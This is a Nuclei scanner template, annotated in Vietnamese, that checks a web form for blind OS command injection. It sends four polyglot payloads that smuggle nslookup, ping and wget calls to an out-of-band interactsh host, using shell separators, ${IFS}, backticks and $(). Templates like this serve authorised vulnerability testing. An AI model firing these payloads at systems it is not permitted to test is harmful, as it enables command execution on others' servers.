id: cmdi-blind-oast-polyglot
# edit
info:
  name: Blind OS Command Injection
  author: pdteam,geeknik
  severity: high
  description: |
    Potential blind OS command injection vulnerabilities, where the application constructs OS commands using unsanitized user input.
    Successful exploitation could lead to arbitrary command execution on the system.
  reference:
    - https://portswigger.net/research/hunting-asynchronous-vulnerabilities
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
  metadata:
    max-request: 4
  tags: cmdi,oast,dast,blind,polyglot
# oast: chèn các payload có khả năng kích hoạt yêu cầu mạng ra bên ngoài, sử dụng server tương tác để nhận các callback khi payload được kích hoạt
variables:
  marker: "{{interactsh-url}}"
# interactsh là doman đặc biệt do nuclei cung cấp
http:
  # cũ
  # - pre-condition: #điều kiện
  #     - type: dsl
  #       dsl:
  #         - 'method == "GET"'
    #them
  - method: POST
    path:
      - "{{BaseURL}}"
    

    body: "ip=127.0.0.1{{payload}}&Submit=Submit"

# gửi các pay load lên server cần tấn công -> nếu tại url nuclei có nhận được phản hồi -> lỗi
    payloads:
      payload:
        - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
        - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
        - "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)"
# bỏ đi vì ở trên đã set path rồi (phần này đang chèn payload vào)
    # fuzzing:
    #   - part: query
    #     type: postfix
    #     fuzz:
    #       - "{{payload}}"

    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: interactsh_protocol
        words:
          - "http"
# digest: 490a0046304402202419d4ba5f4fd3416fe79458763767d93bf1ef5d7d4c6965bf8e45e7c6cbd841022019c41483c2c7a9df4ff398b7c51adf43b795237a5c14ebd46af70e61e6e4ece3:922c64590222798bb761d5b6d8e72950